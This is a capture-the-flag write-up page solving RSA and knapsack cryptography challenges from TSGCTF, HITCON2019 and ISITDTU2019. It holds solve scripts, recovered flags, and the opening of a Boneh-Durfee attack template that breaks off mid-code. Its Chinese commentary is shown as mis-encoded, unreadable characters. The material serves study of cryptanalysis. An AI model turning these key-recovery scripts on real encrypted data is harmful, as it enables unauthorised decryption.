<h3 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h3><p>è§‚å¯Ÿä»–ä»¬çš„gcdå‘ç°å¯ä»¥å…¨éƒ¨é™¤æ‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x =  (<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">10000</span>,<span class="number">10</span>**<span class="number">175</span>))</span><br><span class="line">n = <span class="number">10</span>**<span class="number">175</span></span><br><span class="line"><span class="built_in">print</span>(gcd(x,n))</span><br><span class="line"><span class="built_in">print</span>(gcd(s,n))</span><br><span class="line">GCD = gcd(s,n)</span><br><span class="line">s //= GCD</span><br><span class="line">x //= GCD</span><br><span class="line">n //= GCD</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">m = modinv(x,n)*s%n</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
<h3 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h3><p>å¯ä»¥æ”¹å˜æ¨¡æ•° æ¯”å¦‚<code>10**175 -&gt; 5**175</code>è¿™ç§<br>ä¹Ÿå°±æ˜¯é€‰æ‹©æ–°æ¨¡æ•°ä¸ºåŸæ¥æ¨¡æ•°çš„å› å­ ä¸”æ»¡è¶³å¤§äºmçš„æ¯”ç‰¹æ•°å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">5</span>**<span class="number">175</span></span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">m = modinv(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">10000</span>,n),n)*s%n</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
<p>flag: TSGCTF{0K4y_Y0U_are_r3aDy_t0_Go_aNd_dO_M0r3_CryPt}</p>
<h2 id="modulus-amittendus"><a href="#modulus-amittendus" class="headerlink" title="modulus_amittendus"></a>modulus_amittendus</h2><p>é¢˜ç›®ç»™çš„æ˜¯rugbyä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require &#x27;openssl&#x27;</span><br><span class="line">require &#x27;json&#x27;</span><br><span class="line"></span><br><span class="line">def modinv(a, m)</span><br><span class="line">  m0, inv, x0 = m, 1, 0</span><br><span class="line">  while a &gt; 1</span><br><span class="line">    inv -= (a / m) * x0</span><br><span class="line">    a, m = m, a % m</span><br><span class="line">    inv, x0 = x0, inv</span><br><span class="line">  end</span><br><span class="line">  inv += m0 if inv &lt; 0</span><br><span class="line">  inv</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">class RSA</span><br><span class="line">  def initialize</span><br><span class="line">    @p = OpenSSL::BN::generate_prime(1024, true).to_i</span><br><span class="line">    @q = OpenSSL::BN::generate_prime(1024, true).to_i</span><br><span class="line">    @n = @p * @q</span><br><span class="line">    @e = 65537</span><br><span class="line">    @d = modinv(@e, (@p - 1) * (@q - 1))</span><br><span class="line">    @exp1 = @d % (@p - 1)</span><br><span class="line">    @exp2 = @d % (@q - 1)</span><br><span class="line">    @cf = modinv(@q, @p)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def encrypt(m)</span><br><span class="line">    m.pow(@e, @n)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def decrypt(c)</span><br><span class="line">    m1 = c.pow(@exp1, @p)</span><br><span class="line">    m2 = c.pow(@exp2, @q)</span><br><span class="line">    (m2 + @cf * (m1 - m2) % @p * @q) % @n</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def pubkey</span><br><span class="line">    privkey.to_a[..2].to_h</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def privkey</span><br><span class="line">    &#123;</span><br><span class="line">      e: @e,</span><br><span class="line">      n: @d,</span><br><span class="line">      cf: @cf,</span><br><span class="line">      p: @p,</span><br><span class="line">      q: @q,</span><br><span class="line">      exp1: @exp1,</span><br><span class="line">      exp2: @exp2,</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">flag = File.read(&#x27;flag.txt&#x27;).unpack(&quot;H*&quot;)[0].hex</span><br><span class="line">rsa = RSA.new</span><br><span class="line">p rsa.encrypt(flag)</span><br><span class="line"></span><br><span class="line">File.write(&#x27;pubkey.json&#x27;, JSON.dump(rsa.pubkey))</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™äº† d,e,c,modinv(q,p)è¦æ±‚m<br>æ²¡ä»€ä¹ˆæ€è·¯ ç„ä¸€çœ¼WP è¯´æ˜¯æ¨¡ä»¿çš„ HITCON2019LostModuleAgain ç¡®å®è·Ÿ<a href="https://github.com/pcw109550/write-up/blob/master/2019/HITCON/Lost_Modulus_Again/README.md">åŸé¢˜</a>ä¸€æ¨¡ä¸€æ · </p>
<p>åªæ˜¯åŸé¢˜ç»™äº† modinv(p,q)å’Œmodinv(q,p)è¿™é‡Œåªç»™äº†ä¸€ä¸ª?<br>å¹²è„†å¤ç°åŸé¢˜å§</p>
<h2 id="Sweet-like-Apple-Pie"><a href="#Sweet-like-Apple-Pie" class="headerlink" title="Sweet like Apple Pie"></a>Sweet like Apple Pie</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line">getcontext().prec = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>():</span><br><span class="line">    lasts, t, s, n, na, d, da = <span class="number">0</span>, Decimal(<span class="number">3</span>), <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span></span><br><span class="line">    <span class="keyword">while</span> s != lasts:</span><br><span class="line">        lasts = s</span><br><span class="line">        n, na = n + na, na + <span class="number">8</span></span><br><span class="line">        d, da = d + da, da + <span class="number">32</span></span><br><span class="line">        t = (t * n) / d</span><br><span class="line">        s += t</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sin</span>(<span class="params">x</span>):</span><br><span class="line">    x = Decimal(x) % pi()</span><br><span class="line">    p, factor = <span class="number">0</span>, x</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        p += factor</span><br><span class="line">        factor *= - (x ** <span class="number">2</span>) / ((<span class="number">2</span> * n + <span class="number">2</span>) * (<span class="number">2</span> * n + <span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(flag &lt; <span class="number">2</span> ** <span class="number">500</span>)</span><br><span class="line"><span class="built_in">print</span>(sin(flag))</span><br></pre></td></tr></table></figure>

<p>output.txt</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0.162452474092990408037062573408259688253995107643493293584426591003988903469791005222132158897198623144937279539555347413553688190959907095952250683633029959235933436782707275021817801890433801800730214807785288112267446678747104887584191096749196212784470161670299495426679759221652356130008110761143</span><br></pre></td></tr></table></figure>

<p>??? å®Œå…¨ä¸ä¼šâ€¦ è¿™èƒ½è¿˜åŸ?<br>åªèƒ½çœ‹é¢˜è§£äº†<br><a href="https://ctftime.org/writeup/22580">https://ctftime.org/writeup/22580</a></p>
<p>orz<br>é¢˜è§£æ€è·¯å¤§è‡´å­¦åˆ°äº† ä»£ç å®ç°è¿˜æœ‰ç‚¹å°é—®é¢˜(é¢˜è§£çš„solveä¹Ÿè·‘ä¸å‡ºæ¥å•Šâ€¦O0o?)</p>
<h1 id="HITCON2019"><a href="#HITCON2019" class="headerlink" title="HITCON2019"></a>HITCON2019</h1><h2 id="Lost-Modulus-Again"><a href="#Lost-Modulus-Again" class="headerlink" title="Lost Modulus Again"></a>Lost Modulus Again</h2><p>é¢˜ç›®å°±ä¸è´´äº† å°±æ˜¯RSA å·²çŸ¥e,d,modinv(p,q),modinv(q,p)æ±‚m<br>æ•°æ®:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Key([e = <span class="number">1048583</span>, n = <span class="number">20899585599499852848600179189763086698516108548228367107221738096450499101070075492197700491683249172909869748620431162381087017866603003080844372390109407618883775889949113518883655204495367156356586733638609604914325927159037673858380872827051492954190012228501796895529660404878822550757780926433386946425164501187561418082866346427628551763297010068329425460680225523270632454412376673863754258135691783420342075219153761633410012733450586771838248239221434791288928709490210661095249658730871114233033907339401132548352479119599592161475582267434069666373923164546185334225821332964035123667137917080001159691927</span>, x = <span class="number">22886390627173202444468626406642274959028635116543626995297684671305848436910064602418012808595951325519844918478912090039470530649857775854959462500919029371215000179065185673136642143061689849338228110909931445119687113803523924040922470616407096745128917352037282612768345609735657018628096338779732460743</span>, y = <span class="number">138356012157150927033117814862941924437637775040379746970778376921933744927520585574595823734209547857047013402623714044512594300691782086053475259157899010363944831564630625623351267412232071416191142966170634950729938561841853176635423819365023039470901382901261884795304947251115006930995163847675576699331</span>])</span><br><span class="line">c = <span class="number">0x32074de818f2feeb788e36d7d3ee09f0000381584a72b2fba0dcc9a2ebe5fd79cf2d6fd40c4dbfea27d3489704f2c1a30b17a783baa67229d02043c5bc9bdb995ae984d80a96bd79370ea2c356f39f85a12d16983598c1fb772f9183441fea5dfeb5b26455df75de18ce70a6a9e9dbc0a4ca434ba94cf4d1e5347395cf7aafa756c8a5bd6fd166bc30245a4bded28f5baac38d024042a166369f7515e8b0c479a1965b5988b350064648738f6585c0a0d1463bd536d11a105bb926b44236593b5c6c71ef5b132cd9c211e8ad9131aa53ffde88f5b0df18e7c45bcdb6244edcaa8d386196d25297c259fca3be37f0f2015f40cb5423a918c51383390dfd5a8703</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸å¾—ä¸è¯´å‡ºçš„çœŸçš„å¾ˆå¥½<br>è„šæœ¬å¥—å¤šäº†çœŸçš„ä¼šå¿½ç•¥è¿™äº›å¤§å°ä¼°è®¡ æ•´é™¤å…³ç³» è½¬åŒ–æ–¹ç¨‹â€¦ è¿™äº›æ€æƒ³åœ¨è¿™é“é¢˜ä½“ç°çš„å¾ˆå……åˆ†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q*x = 1+k1*p</span><br><span class="line">p*y = 1+k2*q</span><br><span class="line">=&gt; q*(x+k2) = p*(y+k1)</span><br><span class="line">notice that x&lt;p y&lt;q k1&lt;q k2&lt;p</span><br><span class="line">and p,q are coprime</span><br><span class="line">=&gt; q|(y+k1) &amp; 0&lt;y+k1&lt;2q =&gt; y+k1=q</span><br><span class="line">the same as p =&gt; x+k2=p</span><br><span class="line">suprisingly, we actually have k1*k2+1=x*y   </span><br><span class="line">soshite</span><br><span class="line">=&gt; phi = (p-1)*(q-1)</span><br><span class="line">       = (x+k2-1)*(y+k1-1)</span><br><span class="line">       = (x-1)*(y-1)+k1*(x-1)+k2*(y-1)+k1*k2</span><br><span class="line"></span><br><span class="line">use the equal k1*k2+1=x*y above</span><br><span class="line">=&gt; (x-1)*k1**2+(x*y-1-phi+(x-1)*(y-1))*k1+(y-1)*(x*y-1)=0</span><br><span class="line">è¿™æ ·ä»£å…¥phiçš„æ‰€æœ‰å¯èƒ½å€¼æ±‚è§£ä¸€ä¸ªå…³äºk1çš„äºŒæ¬¡æ–¹ç¨‹ åˆ©ç”¨k1ä¸ºæ•´æ•°çš„é™åˆ¶å°±èƒ½å¾—åˆ°phi</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">1048583</span></span><br><span class="line">d = <span class="number">20899585599499852848600179189763086698516108548228367107221738096450499101070075492197700491683249172909869748620431162381087017866603003080844372390109407618883775889949113518883655204495367156356586733638609604914325927159037673858380872827051492954190012228501796895529660404878822550757780926433386946425164501187561418082866346427628551763297010068329425460680225523270632454412376673863754258135691783420342075219153761633410012733450586771838248239221434791288928709490210661095249658730871114233033907339401132548352479119599592161475582267434069666373923164546185334225821332964035123667137917080001159691927</span></span><br><span class="line">x = <span class="number">22886390627173202444468626406642274959028635116543626995297684671305848436910064602418012808595951325519844918478912090039470530649857775854959462500919029371215000179065185673136642143061689849338228110909931445119687113803523924040922470616407096745128917352037282612768345609735657018628096338779732460743</span></span><br><span class="line">y = <span class="number">138356012157150927033117814862941924437637775040379746970778376921933744927520585574595823734209547857047013402623714044512594300691782086053475259157899010363944831564630625623351267412232071416191142966170634950729938561841853176635423819365023039470901382901261884795304947251115006930995163847675576699331</span></span><br><span class="line">c = <span class="number">0x32074de818f2feeb788e36d7d3ee09f0000381584a72b2fba0dcc9a2ebe5fd79cf2d6fd40c4dbfea27d3489704f2c1a30b17a783baa67229d02043c5bc9bdb995ae984d80a96bd79370ea2c356f39f85a12d16983598c1fb772f9183441fea5dfeb5b26455df75de18ce70a6a9e9dbc0a4ca434ba94cf4d1e5347395cf7aafa756c8a5bd6fd166bc30245a4bded28f5baac38d024042a166369f7515e8b0c479a1965b5988b350064648738f6585c0a0d1463bd536d11a105bb926b44236593b5c6c71ef5b132cd9c211e8ad9131aa53ffde88f5b0df18e7c45bcdb6244edcaa8d386196d25297c259fca3be37f0f2015f40cb5423a918c51383390dfd5a8703</span></span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot,gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># First to calculate possible phis</span></span><br><span class="line">phis = []</span><br><span class="line">kphi = d*e-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,e):</span><br><span class="line">    <span class="keyword">if</span>(kphi%k==<span class="number">0</span>):</span><br><span class="line">        phi = kphi//k</span><br><span class="line">        <span class="keyword">if</span>(gcd(e,phi)==<span class="number">1</span>):</span><br><span class="line">            phis.append(phi)</span><br><span class="line"><span class="comment"># print(len(phis)) # 923</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Then use</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> phis:</span><br><span class="line">    a = (x-<span class="number">1</span>)</span><br><span class="line">    b = (x*y-<span class="number">1</span>-phi+(x-<span class="number">1</span>)*(y-<span class="number">1</span>))</span><br><span class="line">    cc = (y-<span class="number">1</span>)*(x*y-<span class="number">1</span>)</span><br><span class="line">    delta = b*b-<span class="number">4</span>*a*cc</span><br><span class="line">    <span class="keyword">if</span>(iroot(delta,<span class="number">2</span>)[<span class="number">1</span>]==<span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(phi)</span><br><span class="line">        k1 = (-b+iroot(delta,<span class="number">2</span>)[<span class="number">0</span>])//(<span class="number">2</span>*a)</span><br><span class="line">        k2 = (-b-iroot(delta,<span class="number">2</span>)[<span class="number">0</span>])//(<span class="number">2</span>*a)</span><br><span class="line">        <span class="built_in">print</span>(k1,k2)</span><br><span class="line"></span><br><span class="line">phi  = <span class="number">22509077260984027608263845908083202879597081619164800783060781115945741547031252889863077300004310236160814653393991988068104999928735140821504649764471313283345921984799288521496479399032837319974588038186917872597078510975400908137738190304700710900604891709265153418588830065918981914371070605822998222526936764035473024951172438654405051015158373989943636215751206002298354662255322404681649160859586893385153685796114347024559211776931935054744445492193990127160520676232531227390204623950157430966169435920800794748331292066769479560454753704770229274680560878024797177827265072368595931697411659251440631501728</span></span><br><span class="line">k1 = <span class="number">28208949439955302309848635580625081491778513331790561038922122543347871461021445160004265905257374948095564180270338913034580463560285897071083488435445872411686139458980129711508020003449180850634252661246277255619651792037014931213229280933988207275950107375275346841229515570544044065150714741967440182598</span></span><br><span class="line">q = y+k1</span><br><span class="line"><span class="keyword">assert</span> isPrime(q)</span><br><span class="line">p = phi//(q-<span class="number">1</span>)+<span class="number">1</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># hitcon&#123;1t_is_50_easy_t0_find_th3_modulus_back@@!!@!@!@@!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Very-Simple-Haskell"><a href="#Very-Simple-Haskell" class="headerlink" title="Very Simple Haskell"></a>Very Simple Haskell</h2><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Data.Char</span><br><span class="line"><span class="keyword">import</span> System.IO</span><br><span class="line"></span><br><span class="line"><span class="title">n</span> :: <span class="type">Integer</span></span><br><span class="line"><span class="title">n</span> = <span class="number">134896036104102133446208954973118530800743044711419303630456535295204304771800100892609593430702833309387082353959992161865438523195671760946142657809228938824313865760630832980160727407084204864544706387890655083179518455155520501821681606874346463698215916627632418223019328444607858743434475109717014763667</span></span><br><span class="line"></span><br><span class="line"><span class="title">k</span> :: <span class="type">Int</span></span><br><span class="line"><span class="title">k</span> = <span class="number">131</span></span><br><span class="line"></span><br><span class="line"><span class="title">primes</span> :: [<span class="type">Integer</span>]</span><br><span class="line"><span class="title">primes</span> = take k $ sieve (<span class="number">2</span> : [<span class="number">3</span>, <span class="number">5</span>..])</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    sieve (p:xs) = p : sieve [x|x &lt;- xs, x `mod` p &gt; <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="title">stringToInteger</span> :: <span class="type">String</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">stringToInteger</span> str = foldl (\x y -&gt; (toInteger $ ord y) + x*<span class="number">256</span>) <span class="number">0</span> str</span><br><span class="line"></span><br><span class="line"><span class="title">integerToString</span> :: <span class="type">Integer</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">integerToString</span> num = f num <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        f <span class="number">0</span> str = str</span><br><span class="line">        f num str = f (div num <span class="number">256</span>) $ (:) (chr $ fromIntegral $ num `mod` <span class="number">256</span>) str</span><br><span class="line"></span><br><span class="line"><span class="title">numToBits</span> :: <span class="type">Integer</span> -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">numToBits</span> num = f num []</span><br><span class="line">    <span class="keyword">where</span> </span><br><span class="line">        f <span class="number">0</span> arr = arr</span><br><span class="line">        f x arr = f (div x <span class="number">2</span>) ((fromInteger $ x `mod` <span class="number">2</span>) : arr)</span><br><span class="line"></span><br><span class="line"><span class="title">extendBits</span> :: <span class="type">Int</span> -&gt; [<span class="type">Int</span>] -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">extendBits</span> blockLen arr</span><br><span class="line">    | len == <span class="number">0</span> = arr</span><br><span class="line">    | len &gt; <span class="number">0</span> = (replicate (blockLen-len) <span class="number">0</span>) ++ arr</span><br><span class="line">    <span class="keyword">where</span> len = (length arr) `mod` blockLen</span><br><span class="line"></span><br><span class="line"><span class="title">calc</span> :: <span class="type">Integer</span> -&gt; [<span class="type">Int</span>] -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">calc</span> num [] = num</span><br><span class="line"><span class="title">calc</span> num arr = calc result restArr</span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        num2 = num*num `mod` n</span><br><span class="line">        (block, restArr) = splitAt k arr</span><br><span class="line">        zipped = zipWith (\x y -&gt; ((fromIntegral x)*y) `mod` n) block primes  </span><br><span class="line">        mul = product $ filter (/=<span class="number">0</span>) zipped</span><br><span class="line">        result = num2*mul `mod` n</span><br><span class="line"></span><br><span class="line"><span class="title">magic</span> :: <span class="type">String</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">magic</span> input = result</span><br><span class="line">    <span class="keyword">where</span> </span><br><span class="line">        num = stringToInteger input</span><br><span class="line">        bits = numToBits num</span><br><span class="line">        extended = reverse $ extendBits <span class="number">8</span> bits</span><br><span class="line">        oriLen = length extended</span><br><span class="line">        extendedBits = extendBits k extended</span><br><span class="line">        oriLenBits = numToBits $ fromIntegral oriLen</span><br><span class="line">        extendedOriLenBits = extendBits k oriLenBits</span><br><span class="line">        finalBits = extendedOriLenBits ++ extendedBits</span><br><span class="line">        result = show $ calc <span class="number">1</span> (reverse finalBits)</span><br><span class="line"></span><br><span class="line"><span class="title">main</span> = <span class="keyword">do</span></span><br><span class="line">    flag &lt;- readFile <span class="string">&quot;flag&quot;</span></span><br><span class="line">    putStrLn.show $ length flag</span><br><span class="line">    putStrLn $ magic (<span class="string">&quot;the flag is hitcon&#123;&quot;</span> ++ flag ++ <span class="string">&quot;&#125;&quot;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br><span class="line">84329776255618646348016649734028295037597157542985867506958273359305624184282146866144159754298613694885173220275408231387000884549683819822991588176788392625802461171856762214917805903544785532328453620624644896107723229373581460638987146506975123149045044762903664396325969329482406959546962473688947985096</span><br></pre></td></tr></table></figure>

<p>AIå°†haskellè½¬æˆpythonä»£ç  æ˜¯ä¸€ä¸ª Naccache-Stern Knapsack Cryptosystem<br><a href="https://eprint.iacr.org/2017/421.pdf" target="_balnk">here</a><br>emm å…ˆæ”¾è¿™ ä»¥åå†æ¥çœ‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">primes=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,<span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,<span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,<span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,<span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,<span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,<span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,<span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,<span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,<span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,<span class="number">991</span>,<span class="number">997</span>]</span><br><span class="line">n = <span class="number">134896036104102133446208954973118530800743044711419303630456535295204304771800100892609593430702833309387082353959992161865438523195671760946142657809228938824313865760630832980160727407084204864544706387890655083179518455155520501821681606874346463698215916627632418223019328444607858743434475109717014763667</span></span><br><span class="line"></span><br><span class="line">enc=<span class="number">84329776255618646348016649734028295037597157542985867506958273359305624184282146866144159754298613694885173220275408231387000884549683819822991588176788392625802461171856762214917805903544785532328453620624644896107723229373581460638987146506975123149045044762903664396325969329482406959546962473688947985096</span></span><br><span class="line">bit2int = <span class="keyword">lambda</span> x: <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, x)), <span class="number">2</span>)</span><br><span class="line">m = <span class="number">129105988525739869308153101831605950072860268575706582195774923614094296354415364173823406181109200888049609207238266506466864447780824680862439187440797565555486108716502098901182492654356397840996322893263870349262138909453630565384869193972124927953237311411285678188486737576555535085444384901167109670365</span></span><br><span class="line">z = enc * libnum.invmod(m, n) % n</span><br><span class="line">bits = [(z % p == <span class="number">0</span>) * <span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> primes]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>*<span class="number">20</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(bit2int(bits[<span class="number">5</span>:][i:i+<span class="number">8</span>])))</span><br></pre></td></tr></table></figure>


<h1 id="ISITDTU2019"><a href="#ISITDTU2019" class="headerlink" title="ISITDTU2019"></a>ISITDTU2019</h1><h2 id="Easy-RSA-1"><a href="#Easy-RSA-1" class="headerlink" title="Easy_RSA_1"></a>Easy_RSA_1</h2><p>é¢˜ç›®ç»™äº†n,e,c</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n = 137709853388874260067664060306224801065880567280896538344708662296491187670268243771581008615887329285442080267493172576517227603581814922784005894668293664250883858847270414696279127204843462302026428548409668060539273696154323753582118715764251826181439387752900169898505518594134423187783089073450520527969</span><br><span class="line">e = 85605944479801539190292577400294315989703364683792339737453887619652946907819548388390076584246192710348319524405250340541547224543819349494488596679810310694697763188201375896240755682682520811114377302206659716598003967368992125832908158096663258971132148617761060030524535044970322206572134828548118438019</span><br><span class="line">c = 22066874366908131522623165919721031154048372827959879486746669804284618882326621205522887800063326155288431192110879403482210420111408801477749097399368616494107231276644736023482237804800287810317122448198973027350599454646050497733117161743355379588761228932055556016302337519814538743706899009493572298224</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å‘ç°è¿™é‡Œn(1024)å’Œe(1023)çš„bitæ•°å·®çš„å¾ˆå°<br>è¿™é‡Œå­¦ä¹ åˆ°ä¸€æ‰‹ <code>Boneh-Durfee-Attack</code> è¿™ä¸ªæ”»å‡»çš„é€‚ç”¨æ¡ä»¶æ¯”ç»´çº³æ”»å‡»å®½ä¸€ç‚¹<br>æ»¡è¶³ d &lt; N^0.292 æ—¶å¯ä»¥ä½¿ç”¨<br>ç›´æ¥å¥—æ¨¡æ¿äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct</span></span><br><span 